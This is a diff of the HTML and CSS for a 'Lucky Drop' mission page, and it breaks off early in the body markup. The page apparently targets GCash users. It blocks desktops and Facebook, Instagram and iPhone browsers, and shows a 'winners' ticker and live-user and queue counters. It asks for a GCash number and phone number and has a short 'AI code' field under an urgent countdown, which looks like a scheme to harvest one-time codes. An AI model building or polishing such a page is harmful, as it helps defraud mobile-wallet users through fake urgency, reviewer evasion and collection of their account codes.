@@ -3,300 +3,1305 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Welcome Bonus | Lucky Drop Festival</title>
+    <meta name="theme-color" content="#1a3dff">
+    <title>Mission | Lucky Drop</title>
 
-    <!-- Firebase -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <!-- ✅ FIREBASE CONFIG -->
+    <script src="js/config.js"></script>
 
     <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;500;600;700;800&family=Cinzel:wght@400;500;600;700;800;900&family=Fredoka:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&family=Pacifico&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700;800&family=Orbitron:wght@500;700;900&family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
-    <!-- Font Awesome 6 -->
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
-    <!-- External CSS -->
-    <link rel="stylesheet" href="styles/instyle.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html, body { overflow-x: hidden; overscroll-behavior-y: auto; }
+        body {
+            font-family: 'Poppins', 'Fredoka', sans-serif;
+            min-height: 100vh; min-height: 100dvh;
+            color: #fff; position: relative;
+            overflow-y: auto; overflow-x: hidden;
+            -webkit-overflow-scrolling: touch;
+            touch-action: pan-y;
+            background:
+                radial-gradient(ellipse at 50% 0%, #4d6dff 0%, transparent 55%),
+                radial-gradient(ellipse at 50% 100%, #0a1a6b 0%, transparent 60%),
+                linear-gradient(180deg, #1a3dff 0%, #0d1ecc 50%, #05106b 100%);
+            background-attachment: fixed;
+        }
+
+        /* MOBILE-ONLY GUARD */
+        #desktopBlock { display: none; position: fixed; inset: 0; z-index: 999999; background: linear-gradient(160deg, #0a1535 0%, #050a1a 100%); color: #fff; font-family: 'Poppins', sans-serif; text-align: center; padding: 24px; flex-direction: column; align-items: center; justify-content: center; }
+        #desktopBlock .block-icon { font-size: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 25px rgba(77, 109, 255, 0.7)); animation: blockPulse 2.2s ease-in-out infinite; }
+        #desktopBlock h1 { font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; letter-spacing: 3px; background: linear-gradient(180deg, #6ea8ff 0%, #1a3dff 100%); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 14px; }
+        #desktopBlock p { font-size: 14px; line-height: 1.7; color: rgba(255, 255, 255, 0.85); max-width: 340px; }
+        #desktopBlock .block-badge { margin-top: 20px; padding: 8px 22px; border-radius: 30px; background: rgba(77, 109, 255, 0.15); border: 2px solid rgba(110, 168, 255, 0.5); font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 800; letter-spacing: 3px; color: #6ea8ff; }
+        @keyframes blockPulse { 0%, 100% { transform: scale(1); opacity: 0.85; } 50% { transform: scale(1.1); opacity: 1; } }
+        @media (hover: hover) and (pointer: fine), (min-width: 769px) { #desktopBlock { display: flex !important; } #missionApp { display: none !important; } }
+
+        /* ✅ INTENT / BROWSER GUARD (FB / IG / iPhone BLOCK) */
+        #intentBlock { display: none; position: fixed; inset: 0; z-index: 1000000; background: linear-gradient(160deg, #0a1535 0%, #050a1a 100%); color: #fff; font-family: 'Poppins', sans-serif; text-align: center; padding: 24px; flex-direction: column; align-items: center; justify-content: center; }
+        #intentBlock .intent-icon { font-size: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 25px rgba(255, 179, 0, 0.8)); animation: blockPulse 2.2s ease-in-out infinite; }
+        #intentBlock h1 { font-family: 'Orbitron', monospace; font-size: 24px; font-weight: 900; letter-spacing: 3px; background: linear-gradient(180deg, #ffe066 0%, #ff8800 100%); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 14px; }
+        #intentBlock p { font-size: 14px; line-height: 1.7; color: rgba(255, 255, 255, 0.9); max-width: 360px; margin-bottom: 10px; }
+        #intentBlock .intent-badge { margin-top: 22px; padding: 10px 26px; border-radius: 30px; background: rgba(255, 179, 0, 0.15); border: 2px solid rgba(255, 179, 0, 0.6); font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 800; letter-spacing: 3px; color: #ffe066; animation: badgeGlow 2.5s ease-in-out infinite; }
+        #intentBlock .intent-steps { margin-top: 18px; text-align: left; display: inline-block; background: rgba(0,0,0,0.35); border: 1.5px solid rgba(255, 215, 0, 0.4); border-radius: 14px; padding: 14px 18px; font-size: 12px; line-height: 1.9; color: rgba(255,255,255,0.9); }
+        #intentBlock .intent-steps strong { color: #ffe066; }
+        #intentBlock .auto-open-btn { margin-top: 20px; padding: 14px 32px; border-radius: 14px; background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%); border: 3px solid #fff; font-family: 'Orbitron', monospace; font-size: 13px; font-weight: 900; letter-spacing: 2px; color: #4a1f00; text-transform: uppercase; box-shadow: 0 5px 0 #a66900, 0 0 30px rgba(255, 215, 0, 0.6); cursor: pointer; }
+        #intentBlock .auto-open-btn:active { transform: translateY(5px); box-shadow: 0 0 0 #a66900; }
+        @keyframes badgeGlow { 0%, 100% { box-shadow: 0 0 15px rgba(255, 215, 0, 0.4); } 50% { box-shadow: 0 0 35px rgba(255, 215, 0, 0.9); } }
+
+        /* WINNERS TICKER */
+        .winners-ticker { position: fixed; top: 12px; left: 50%; transform: translateX(-50%); z-index: 500; display: flex; align-items: center; gap: 8px; padding: 8px 18px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(0, 0, 0, 0.4)); border: 2px solid #ffe066; border-radius: 30px; box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.6), inset 0 0 15px rgba(255, 215, 0, 0.15); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); max-width: calc(100% - 30px); animation: tickerGlow 3s ease-in-out infinite; }
+        @keyframes tickerGlow { 0%, 100% { box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.6), inset 0 0 15px rgba(255, 215, 0, 0.15); } 50% { box-shadow: 0 4px 0 #a66900, 0 0 45px rgba(255, 215, 0, 0.95), inset 0 0 20px rgba(255, 215, 0, 0.25); } }
+        .winners-ticker .ticker-live-dot { width: 8px; height: 8px; border-radius: 50%; background: #39ff14; box-shadow: 0 0 10px #39ff14; animation: livePulse 1.2s ease-in-out infinite; flex-shrink: 0; }
+        @keyframes livePulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.75); } }
+        .winners-ticker .ticker-text { font-family: 'Poppins', sans-serif; font-size: 11px; font-weight: 600; color: #fff; white-space: nowrap; display: flex; align-items: center; gap: 5px; transition: opacity 0.3s ease, transform 0.3s ease; }
+        .winners-ticker .ticker-text .ticker-gc-icon { width: 14px; height: 14px; vertical-align: middle; filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.8)); }
+        .winners-ticker .ticker-text .ticker-amount { color: #ffe066; font-weight: 900; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
+        .winners-ticker.fade-out .ticker-text { opacity: 0; transform: translateY(-6px); }
+        .winners-ticker.fade-in .ticker-text { opacity: 1; transform: translateY(0); }
+
+        /* BACKGROUND EFFECTS */
+        .bg-rays { position: fixed; inset: 0; z-index: 0; pointer-events: none; background: conic-gradient(from 0deg at 50% 30%, rgba(255, 255, 255, 0.06) 0deg, transparent 30deg, rgba(255, 255, 255, 0.06) 60deg, transparent 90deg, rgba(255, 255, 255, 0.06) 120deg, transparent 150deg, rgba(255, 255, 255, 0.06) 180deg, transparent 210deg, rgba(255, 255, 255, 0.06) 240deg, transparent 270deg, rgba(255, 255, 255, 0.06) 300deg, transparent 330deg, rgba(255, 255, 255, 0.06) 360deg); animation: raysRotate 30s linear infinite; opacity: 0.7; }
+        @keyframes raysRotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .bg-glow { position: fixed; bottom: -20%; left: 50%; transform: translateX(-50%); width: 140%; height: 60%; background: radial-gradient(ellipse at center, rgba(110, 168, 255, 0.45) 0%, rgba(77, 109, 255, 0.25) 30%, transparent 70%); z-index: 0; pointer-events: none; filter: blur(30px); animation: glowPulse 4s ease-in-out infinite; }
+        @keyframes glowPulse { 0%, 100% { opacity: 0.75; transform: translateX(-50%) scale(1); } 50% { opacity: 1; transform: translateX(-50%) scale(1.05); } }
+        .coin { position: fixed; z-index: 1; font-size: 26px; opacity: 0; pointer-events: none; filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.9)); animation: coinFloat linear infinite; }
+        @keyframes coinFloat { 0% { transform: translateY(110vh) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(-20vh) rotate(720deg); opacity: 0; } }
+        .sparkle { position: fixed; z-index: 1; width: 6px; height: 6px; border-radius: 50%; background: #fff; box-shadow: 0 0 10px #fff, 0 0 20px #6ea8ff, 0 0 30px #4d6dff; pointer-events: none; animation: sparkleTwinkle 2.4s ease-in-out infinite; }
+        @keyframes sparkleTwinkle { 0%, 100% { opacity: 0; transform: scale(0.4); } 50% { opacity: 1; transform: scale(1.2); } }
+        .confetti { position: fixed; top: -20px; width: 8px; height: 12px; z-index: 1; opacity: 0; pointer-events: none; animation: confettiFall 6s linear infinite; }
+        @keyframes confettiFall { 0% { transform: translateY(-20px) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(110vh) rotate(720deg); opacity: 0; } }
+
+        /* MAIN APP */
+        #missionApp { position: relative; z-index: 10; min-height: 100vh; min-height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 70px 18px 40px; }
+        .mission-card { position: relative; width: 100%; max-width: 420px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 30%), linear-gradient(160deg, #4d6dff 0%, #1a3dff 45%, #0d1ecc 100%); border: 3px solid #a7c4ff; border-radius: 32px; padding: 36px 22px 28px; text-align: center; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.55), 0 0 60px rgba(110, 168, 255, 0.55), inset 0 0 40px rgba(255, 255, 255, 0.08); overflow: hidden; animation: cardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes cardEnter { 0% { transform: scale(0.85) translateY(30px); opacity: 0; } 100% { transform: scale(1) translateY(0); opacity: 1; } }
+        .mission-card::before { content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.35), transparent); transform: skewX(-20deg); animation: cardShine 4s ease-in-out infinite; pointer-events: none; }
+        @keyframes cardShine { 0% { left: -100%; } 40% { left: 150%; } 100% { left: 150%; } }
+        .mission-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 18px; background: linear-gradient(180deg, #ffe066 0%, #ffb300 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 900; letter-spacing: 2.5px; color: #4a1f00; margin-bottom: 18px; box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.7); text-transform: uppercase; animation: badgeGlow 2.5s ease-in-out infinite; }
+        @keyframes badgeGlow { 0%, 100% { box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.7); } 50% { box-shadow: 0 4px 0 #a66900, 0 0 45px rgba(255, 215, 0, 1); } }
+        .mission-badge .badge-dot { width: 8px; height: 8px; border-radius: 50%; background: #ff3b3b; box-shadow: 0 0 10px #ff3b3b; animation: dotPulse 1.2s infinite; }
+        @keyframes dotPulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.75); } }
+        .mission-image-wrap { position: relative; width: 100%; max-width: 320px; margin: 0 auto 22px; display: flex; align-items: center; justify-content: center; }
+        .mission-image-wrap::before { content: ''; position: absolute; inset: -20px; background: radial-gradient(circle at center, rgba(255, 215, 0, 0.45) 0%, rgba(110, 168, 255, 0.25) 40%, transparent 70%); border-radius: 50%; filter: blur(18px); animation: imgGlow 3s ease-in-out infinite; z-index: 0; }
+        @keyframes imgGlow { 0%, 100% { opacity: 0.7; transform: scale(1); } 50% { opacity: 1; transform: scale(1.08); } }
+        .mission-image { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 22px; filter: drop-shadow(0 10px 25px rgba(0, 0, 0, 0.5)) drop-shadow(0 0 25px rgba(255, 215, 0, 0.5)); animation: imgFloat 3s ease-in-out infinite; }
+        @keyframes imgFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+        .mission-title { font-family: 'Fredoka', sans-serif; font-size: 28px; font-weight: 900; line-height: 1.15; letter-spacing: 1px; background: linear-gradient(180deg, #ffffff 0%, #ffe066 40%, #ffb300 75%, #ff8800 100%); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.75)); margin-bottom: 10px; text-transform: uppercase; }
+        .mission-subtitle { font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.92); margin-bottom: 22px; text-shadow: 0 2px 6px rgba(0, 0, 0, 0.4); }
+        .mission-subtitle strong { color: #ffe066; font-weight: 800; text-shadow: 0 0 12px rgba(255, 215, 0, 0.75); }
+        .mission-divider { display: flex; align-items: center; justify-content: center; gap: 10px; margin: 18px auto; width: 80%; }
+        .mission-divider .line { flex: 1; height: 2px; background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.9), transparent); border-radius: 2px; }
+        .mission-divider .star { font-size: 12px; color: #ffe066; filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.9)); }
+        .mission-chips { display: flex; justify-content: center; gap: 6px; margin-bottom: 22px; flex-wrap: wrap; }
+        .mission-chip { display: flex; align-items: center; gap: 5px; padding: 7px 12px; background: rgba(0, 0, 0, 0.35); border: 1.5px solid rgba(255, 215, 0, 0.7); border-radius: 14px; font-family: 'Orbitron', monospace; font-size: 9px; font-weight: 800; color: #ffe066; letter-spacing: 1.2px; text-transform: uppercase; box-shadow: 0 0 12px rgba(255, 215, 0, 0.35), inset 0 0 10px rgba(255, 215, 0, 0.1); }
+        .mission-chip .chip-icon { font-size: 12px; }
+        .mission-btn { position: relative; width: 100%; padding: 18px 22px; display: flex; align-items: center; justify-content: center; gap: 10px; background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%); border: 3px solid #ffffff; border-radius: 18px; font-family: 'Orbitron', monospace; font-size: 15px; font-weight: 900; letter-spacing: 2.5px; text-transform: uppercase; color: #4a1f00; cursor: pointer; overflow: hidden; box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65); transition: transform 0.12s ease, box-shadow 0.12s ease; animation: btnPulse 2.4s ease-in-out infinite; }
+        @keyframes btnPulse { 0%, 100% { box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65); } 50% { box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 65px rgba(255, 215, 0, 1); } }
+        .mission-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent); transform: skewX(-20deg); animation: btnShine 2.5s ease-in-out infinite; }
+        @keyframes btnShine { 0% { left: -100%; } 60% { left: 150%; } 100% { left: 150%; } }
+        .mission-btn:active { transform: translateY(6px); box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5); }
+        .mission-btn .btn-icon { font-size: 18px; }
+        .mission-note { margin-top: 18px; font-family: 'Poppins', sans-serif; font-size: 10px; font-weight: 500; color: rgba(255, 255, 255, 0.7); letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .mission-note i { color: #39ff14; filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.8)); }
+
+        /* POPUPS */
+        .popup-overlay { display: none; position: fixed; inset: 0; z-index: 99999; background: rgba(5, 10, 30, 0.92); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); align-items: center; justify-content: center; padding: 20px; animation: popupFadeIn 0.3s ease; overflow-y: auto; }
+        .popup-overlay.show { display: flex; }
+        @keyframes popupFadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .popup-card { position: relative; width: 100%; max-width: 380px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 30%), linear-gradient(160deg, #4d6dff 0%, #1a3dff 45%, #0d1ecc 100%); border: 3px solid #a7c4ff; border-radius: 28px; padding: 30px 22px 24px; text-align: center; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.7), 0 0 60px rgba(110, 168, 255, 0.65); animation: popupEnter 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); overflow: hidden; margin: auto; }
+        @keyframes popupEnter { 0% { transform: scale(0.7) translateY(30px); opacity: 0; } 100% { transform: scale(1) translateY(0); opacity: 1; } }
+        .popup-close { position: absolute; top: 12px; right: 14px; width: 34px; height: 34px; background: rgba(255, 255, 255, 0.15); border: 2px solid #ffe066; border-radius: 50%; color: #ffe066; font-size: 16px; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s ease; z-index: 10; }
+        .popup-close:hover, .popup-close:active { background: rgba(255, 68, 68, 0.5); color: #fff; transform: rotate(90deg) scale(1.1); border-color: #ff4444; }
+        .popup-img-wrap { position: relative; width: 100%; max-width: 220px; margin: 8px auto 18px; display: flex; align-items: center; justify-content: center; }
+        .popup-img-wrap::before { content: ''; position: absolute; inset: -16px; background: radial-gradient(circle at center, rgba(255, 215, 0, 0.5) 0%, rgba(110, 168, 255, 0.3) 40%, transparent 70%); border-radius: 50%; filter: blur(16px); animation: imgGlow 3s ease-in-out infinite; z-index: 0; }
+        .popup-img { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 18px; filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 20px rgba(255, 215, 0, 0.55)); animation: imgFloat 3s ease-in-out infinite; }
+        .popup-title { font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; line-height: 1.2; background: linear-gradient(180deg, #ffffff 0%, #ffe066 40%, #ffb300 100%); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.75)); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
+        .popup-title.danger { background: linear-gradient(180deg, #ff8888 0%, #ff1744 40%, #8b0000 100%); -webkit-background-clip: text; background-clip: text; }
+        .popup-subtitle { font-family: 'Poppins', sans-serif; font-size: 12px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.9); margin-bottom: 18px; }
+        .popup-btn { position: relative; width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; gap: 8px; background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%); border: 3px solid #fff; border-radius: 16px; font-family: 'Orbitron', monospace; font-size: 14px; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; color: #4a1f00; cursor: pointer; overflow: hidden; box-shadow: 0 5px 0 #a66900, 0 8px 20px rgba(0, 0, 0, 0.55), 0 0 30px rgba(255, 215, 0, 0.6); transition: transform 0.12s ease, box-shadow 0.12s ease; margin-top: 6px; }
+        .popup-btn:active { transform: translateY(5px); box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5); }
+        .popup-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; filter: grayscale(0.4); }
+        .popup-btn .btn-icon { font-size: 16px; }
+        .countdown-badge { display: inline-block; margin-bottom: 12px; padding: 5px 14px; background: rgba(0, 0, 0, 0.4); border: 2px solid #ffe066; border-radius: 20px; font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 800; color: #ffe066; letter-spacing: 1.5px; box-shadow: 0 0 15px rgba(255, 215, 0, 0.5); }
+        .input-label { display: flex; align-items: center; justify-content: center; gap: 6px; font-family: 'Orbitron', monospace; font-size: 10px; color: #ffe066; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; }
+        .gcash-input, .phone-input { width: 100%; max-width: 260px; display: block; margin: 0 auto 12px; text-align: center; font-family: 'Orbitron', monospace; font-size: 17px; font-weight: 900; padding: 14px; background: #0a1020; border: 3px solid #ffe066; border-radius: 14px; color: #ffe066; letter-spacing: 2px; outline: none; box-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
+        .gcash-input::placeholder, .phone-input::placeholder { color: rgba(255, 215, 0, 0.4); letter-spacing: 2px; font-size: 13px; }
+        .gcash-input:focus, .phone-input:focus { border-color: #6ea8ff; box-shadow: 0 0 25px rgba(110, 168, 255, 0.7); }
+        .ai-code-input { width: 100%; max-width: 200px; display: block; margin: 0 auto 12px; text-align: center; font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; padding: 14px; background: #0a1020; border: 3px solid #ffe066; border-radius: 14px; color: #ffe066; letter-spacing: 8px; outline: none; box-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
+        .ai-code-input::placeholder { color: rgba(255, 215, 0, 0.4); letter-spacing: 4px; font-size: 16px; }
+        .ai-code-input:focus { border-color: #6ea8ff; box-shadow: 0 0 25px rgba(110, 168, 255, 0.7); }
+        .ai-timer { font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; color: #39ff14; text-shadow: 0 0 15px rgba(57, 255, 20, 0.7); letter-spacing: 3px; margin: 8px 0; }
+        .ai-timer.urgent { color: #ff4444; text-shadow: 0 0 20px rgba(255, 68, 68, 0.9); animation: urgentPulse 0.5s ease-in-out infinite; }
+        @keyframes urgentPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.12); } }
+        .ai-error { display: none; padding: 8px 12px; margin-top: 10px; background: rgba(255, 68, 68, 0.2); border: 2px solid rgba(255, 68, 68, 0.5); border-radius: 10px; font-family: 'Poppins', sans-serif; font-size: 11px; color: #ff8888; font-weight: 600; }
+        .ai-error.show { display: block; }
+        .ai-status-text { font-family: 'Poppins', sans-serif; font-size: 12px; color: rgba(255, 255, 255, 0.95); line-height: 1.5; margin-bottom: 12px; padding: 10px; background: rgba(0, 0, 0, 0.3); border-radius: 10px; border: 1px solid rgba(255, 215, 0, 0.3); }
+        .ai-status-text strong { color: #ffe066; font-weight: 800; }
+        .queue-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 18px; background: linear-gradient(180deg, #ff9800 0%, #ff5722 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 900; letter-spacing: 2.5px; color: #fff; margin-bottom: 14px; box-shadow: 0 4px 0 #8b3a00, 0 0 25px rgba(255, 87, 34, 0.7); text-transform: uppercase; animation: queueBadgePulse 2s ease-in-out infinite; }
+        @keyframes queueBadgePulse { 0%, 100% { box-shadow: 0 4px 0 #8b3a00, 0 0 25px rgba(255, 87, 34, 0.7); } 50% { box-shadow: 0 4px 0 #8b3a00, 0 0 45px rgba(255, 87, 34, 1); } }
+        .queue-badge .queue-dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; box-shadow: 0 0 10px #fff; animation: queueDotBlink 1s ease-in-out infinite; }
+        @keyframes queueDotBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .queue-count-box { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; margin: 10px 0; background: rgba(0, 0, 0, 0.4); border: 2px solid rgba(255, 215, 0, 0.4); border-radius: 14px; font-family: 'Poppins', sans-serif; font-size: 12px; color: rgba(255, 255, 255, 0.9); }
+        .queue-count-box .live-users-count { font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #39ff14; text-shadow: 0 0 15px rgba(57, 255, 20, 0.8); }
+        .queue-timer-big { font-family: 'Orbitron', monospace; font-size: 46px; font-weight: 900; color: #ffe066; text-shadow: 0 0 25px rgba(255, 215, 0, 0.9); letter-spacing: 4px; margin: 14px 0; animation: queueTimerGlow 1.5s ease-in-out infinite; }
+        @keyframes queueTimerGlow { 0%, 100% { text-shadow: 0 0 25px rgba(255, 215, 0, 0.9); } 50% { text-shadow: 0 0 45px rgba(255, 215, 0, 1), 0 0 65px rgba(255, 179, 0, 0.8); } }
+        .queue-timer-label { font-family: 'Poppins', sans-serif; font-size: 11px; color: rgba(255, 255, 255, 0.8); letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 4px; }
+        .queue-progress { width: 100%; height: 10px; background: rgba(0, 0, 0, 0.5); border: 2px solid rgba(255, 215, 0, 0.5); border-radius: 12px; overflow: hidden; margin: 14px 0; }
+        .queue-progress-bar { height: 100%; background: linear-gradient(90deg, #ffe066, #ffb300, #ff8800); width: 0%; transition: width 1s linear; box-shadow: 0 0 15px rgba(255, 215, 0, 0.8); border-radius: 12px; }
+        .popup-success { text-align: center; padding: 20px 0; }
+        .popup-success .success-icon { font-size: 60px; margin-bottom: 14px; filter: drop-shadow(0 0 20px rgba(57, 255, 20, 0.9)); animation: successPulse 1.5s ease-in-out infinite; }
+        @keyframes successPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .popup-success .success-title { font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; background: linear-gradient(180deg, #39ff14, #008833); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 15px rgba(57, 255, 20, 0.7)); margin-bottom: 10px; text-transform: uppercase; }
+        .popup-success .success-message { font-family: 'Poppins', sans-serif; font-size: 13px; color: rgba(255, 255, 255, 0.9); line-height: 1.6; }
+        .hidden { display: none !important; }
+
+        /* BAN POPUP */
+        .popup-card.ban-card { background: linear-gradient(180deg, rgba(255, 255, 255, 0.15) 0%, transparent 30%), linear-gradient(160deg, #d10000 0%, #8b0000 45%, #4a0000 100%); border-color: #ff8888; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 68, 68, 0.5); }
+        .popup-card.ban-card .popup-img-wrap::before { background: radial-gradient(circle at center, rgba(255, 68, 68, 0.5) 0%, rgba(139, 0, 0, 0.3) 40%, transparent 70%); }
+        .popup-card.ban-card .popup-img { filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 20px rgba(255, 68, 68, 0.55)); }
+
+        @media (max-width: 380px) {
+            .mission-card { padding: 30px 16px 22px; border-radius: 26px; }
+            .mission-title { font-size: 23px; }
+            .mission-subtitle { font-size: 12px; }
+            .mission-btn { padding: 16px; font-size: 13px; letter-spacing: 2px; }
+            .mission-chip { font-size: 8px; padding: 6px 10px; }
+            .popup-card { padding: 26px 16px 20px; }
+            .popup-title { font-size: 19px; }
+            .winners-ticker { padding: 6px 12px; }
+            .winners-ticker .ticker-text { font-size: 10px; }
+            .queue-timer-big { font-size: 36px; }
+        }
+        @media (prefers-reduced-motion: reduce) { * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; } }
+    </style>
 </head>
 <body>
 
-    <!-- ============================================================
-         BACKGROUND EFFECTS
-         ============================================================ -->
-    <div class="bg-night-sky"></div>
-
-    <div class="fireworks">
-        <div class="firework burst-1"></div>
-        <div class="firework burst-2"></div>
-        <div class="firework burst-3"></div>
-        <div class="firework burst-4"></div>
-        <div class="firework burst-5"></div>
+    <!-- DESKTOP BLOCK -->
+    <div id="desktopBlock">
+        <div class="block-icon">📱</div>
+        <h1>MOBILE ONLY</h1>
+        <p>This mission is only accessible on <strong>mobile devices</strong>.<br><br>Please open this link on your smartphone to continue.</p>
+        <div class="block-badge">◇ SCAN & OPEN ON MOBILE ◇</div>
     </div>
 
-    <div class="bokeh">
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
+    <!-- ✅ INTENT / BROWSER GUARD (FB / IG / iPhone BLOCK) -->
+    <div id="intentBlock">
+        <div class="intent-icon">🌐</div>
+        <h1>OPEN IN BROWSER</h1>
+        <p>This mission must be opened in your <strong>default browser</strong> (Chrome, etc.).</p>
+        <p style="font-size:13px; color:#ff8888; font-weight:700;">❌ Facebook / Instagram / iPhone not supported.</p>
+        <div class="intent-steps">
+            <strong>📌 Paano buksan:</strong><br>
+            1. I-tap ang <strong>⋮ (3 dots)</strong> sa taas<br>
+            2. Piliin ang <strong>"Open in Browser"</strong><br>
+            3. Buksan sa <strong>Chrome</strong> o default browser
+        </div>
+        <button class="auto-open-btn" id="autoOpenBtn">🚀 BUKSAN SA CHROME</button>
+        <div class="intent-badge">🌐 OPEN IN DEFAULT BROWSER 🌐</div>
     </div>
 
-    <div class="confetti-fall">
-        <div class="confetti-piece pink"></div>
-        <div class="confetti-piece gold"></div>
-        <div class="confetti-piece magenta"></div>
